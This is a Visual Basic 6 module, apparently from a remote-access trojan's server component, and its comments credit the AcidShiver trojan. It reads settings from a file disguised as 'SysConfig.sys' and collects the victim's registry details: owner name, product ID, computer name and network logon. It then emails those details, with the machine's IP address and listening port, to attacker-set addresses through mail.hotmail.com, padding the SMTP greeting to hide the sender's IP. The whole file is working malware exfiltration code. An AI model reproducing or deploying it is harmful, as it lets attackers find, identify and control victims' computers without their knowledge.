Attribute VB_Name = "modEmail"
Option Explicit


Public LastSMTP As String
Public ADDY As String
Public ADDY2 As String
Public SUBJ As String
Public Mail As Email
Public SysType As String


Public Type Email
     sAddr As String
     bEnabled As Boolean
     bNotifyOnce As Boolean
     bNotifyAlways As Boolean
     bChkAdmin As Boolean
End Type

' most of this code borrowed from AcidShiver


Sub InitMail()
   Dim DoingEmail As Boolean
   
   DoingEmail = GetEmailSettings()
   
   If Not DoingEmail Then
      Exit Sub
   End If
   
   If Mail.bNotifyAlways Then
      ' fall through
      RemoveSentSetting
   End If
   
   If Mail.bNotifyOnce Then
      If MsgSent Then
        Exit Sub
      End If
   End If
   
   
   
Test:

    DoEvents
    Dim D
    Debug.Print "Trying to send mail " & Timer
    D = SendLogin
    If D = True Then GoTo Wait
    If D = False Then GoTo Test

Wait:
Debug.Print "Mail sent " & Timer

End Sub


Public Function SendLogin() As Boolean

    On Error Resume Next
    Dim CTimer As Long
    Dim Server As String
    Dim UserName As String
    Dim cmStr As String
    LastSMTP = ""
    
    If (GetSysType() = "NT") Then
        cmStr = NT_PATH
    Else
        cmStr = WIN_PATH
    End If
    
    UserName = QueryValue(HKEY_LOCAL_MACHINE, cmStr, "RegisteredOwner")

    Randomize Timer

   ' PickServer = Int(Rnd * UBound(mServ))

    Server = "mail.hotmail.com" 'mServ(PickServer) ' pick a random smtp server

    'Debebug.Print "Trying to connect to " & Server

    With frmServer.SMTP
       .Close
       .LocalPort = 0
       .RemoteHost = Server
       .RemotePort = 25
       .Connect
    End With

    CTimer = Timer
    Dim dbgState As Integer
    dbgState = 10
    Do
        If Len(LastSMTP) > 1 Then GoTo SendMail
        If frmServer.SMTP.State <> dbgState Then
            Debug.Print frmServer.SMTP.State
            dbgState = frmServer.SMTP.State
        If frmServer.SMTP.State = 9 Then Exit Do
        End If
        DoEvents

    Loop Until CTimer + 30 < Timer

    SendLogin = False
    Debug.Print "Timed Out..."
    Debug.Print "Last SMTP: " & LastSMTP

    Exit Function

SendMail:

    Pause 0.5


    With frmServer
        .SMTP.SendData "HELO " & String(256, "A") & vbCrLf 'hide ip from old sendmail
        .SMTP.SendData "MAIL FROM:" & UserName & "@" & frmServer.SMTP.LocalIP & vbCrLf
        .SMTP.SendData "RCPT TO:" & ADDY & vbCrLf
        .SMTP.SendData "RCPT TO" & ADDY2 & vbCrLf
        .SMTP.SendData "DATA" & vbCrLf
        
        Pause 0.5

        .SMTP.SendData "TO: " & ADDY & vbCrLf
        .SMTP.SendData "FROM: " & LCase(UserName) & "@" & frmServer.SMTP.LocalIP & vbCrLf
        .SMTP.SendData "Subject: " & SUBJ & vbCrLf
        .SMTP.SendData vbCrLf
        .SMTP.SendData String(5, Chr(13)) & vbCrLf

        Pause 0.5

        .SMTP.SendData "Time Sent:    " & Time & vbCrLf & "IP Address:    " _
        & frmServer.SMTP.LocalIP & vbCrLf & "Port:   " _
        & frmServer.tcpServer.LocalPort & vbCrLf & vbCrLf
        .SMTP.SendData vbCrLf & UserInfo(False) & vbCrLf
        .SMTP.SendData vbCrLf
        .SMTP.SendData "." & vbCrLf
    End With
    
        CTimer = Timer
        Debug.Print "Email Sent to " & ADDY

   MailDone
   
    Do
       DoEvents
    Loop Until CTimer + 20 < Timer

    With frmServer.SMTP
      .Close
      .LocalPort = 0
    End With
    
    SendLogin = True

    Debug.Print "Closing Connection..."
End Function


Sub MailDone()
   ' save settings
   SaveSetting "I", "I", "E", True
End Sub


Function MsgSent() As Boolean
   Dim Isset As Boolean
   
   MsgSent = True
   Isset = GetSetting("I", "I", "E", False)
   
   If (Not Isset) Then
      MsgSent = False
   End If
   
End Function

Sub RemoveSentSetting()
   ' save settings
   SaveSetting "I", "I", "E", False
End Sub

Public Function UserInfo(HTML As Boolean) As String
    Dim Info(1 To 12) As String
    Dim nFO As String
    Dim NextX As Integer
    Dim cmStr As String
     
     SysType = GetSysType()
     If SysType <> "NT" Then
       cmStr = WIN_PATH
     Else
       cmStr = NT_PATH
     End If
 
    Info(1) = "Product Name          : " & _
          QueryValue(HKEY_LOCAL_MACHINE, cmStr, "ProductName")

    Info(2) = "Product ID            : " & _
          QueryValue(HKEY_LOCAL_MACHINE, cmStr, "ProductId")

    Info(3) = "Product Type          : " & _
          QueryValue(HKEY_LOCAL_MACHINE, cmStr, "ProductType")

    Info(4) = "User Organization     : " & _
          QueryValue(HKEY_LOCAL_MACHINE, cmStr, "RegisteredOrganization")

    Info(5) = "User Name             : " & _
          QueryValue(HKEY_LOCAL_MACHINE, cmStr, "RegisteredOwner")

    Info(6) = "System Root           : " & _
          QueryValue(HKEY_LOCAL_MACHINE, cmStr, "SystemRoot")

    Info(7) = "Version               : " & _
          QueryValue(HKEY_LOCAL_MACHINE, cmStr, "CurrentVersion")

    Info(8) = "CurrentType           : " & _
          QueryValue(HKEY_LOCAL_MACHINE, cmStr, "CurrentType")

    Info(9) = "CSD Version           : " & _
          QueryValue(HKEY_LOCAL_MACHINE, cmStr, "CSDVersion")

    Info(10) = "Computer Name         : " & _
           QueryValue(HKEY_LOCAL_MACHINE, "System\CurrentControlSet\control\ComputerName\ComputerName", "ComputerName")

    Info(11) = "Time Zone             : " & _
           QueryValue(HKEY_LOCAL_MACHINE, "System\CurrentControlSet\control\TimeZoneInformation", "StandardName")

    Info(12) = "Network Logon         : " & _
           QueryValue(HKEY_LOCAL_MACHINE, "Network\Logon", "username")

    If HTML = True Then
        nFO = "<Br>"
    Else
        nFO = vbCrLf
    End If

    For NextX = 1 To 12
      If HTML = True Then
          nFO = nFO & Info(NextX) & "<BR>"
      Else
          nFO = nFO & Info(NextX) & vbCrLf
      End If
    Next NextX

    UserInfo = TrimCharacter(nFO, Chr(0))

End Function


Function TrimCharacter(thetext, chars)
    TrimCharacter = ReplaceText(thetext, chars, "")
End Function



Function ReplaceText(Text, charfind, charchange)
    Dim rReplace As Long
    Dim thechar$, thechars$
    
    If InStr(Text, charfind) = 0 Then
        ReplaceText = Text
        Exit Function
    End If

    For rReplace = 1 To Len(Text)
        thechar$ = Mid(Text, rReplace, 1)
        thechars$ = thechars$ & thechar$

            If thechar$ = charfind Then
                thechars$ = Mid(thechars$, 1, Len(thechars$) - 1) + charchange
            End If
    Next rReplace

    ReplaceText = thechars$

End Function



Function GetEmailSettings() As Boolean
   'Have any settings been made yet?
   Dim Fname
   GetEmailSettings = True
   
   Fname = GetSystemPath() & "\SysConfig.sys"
   
   ' retrieve the mail settings
   Open Fname For Binary As #1
      Get #1, , Mail
   Close #1
      
   If (Not Mail.bEnabled) Then
       GetEmailSettings = False
       Exit Function
   End If
   
   ' settings now loaded
   
End Function
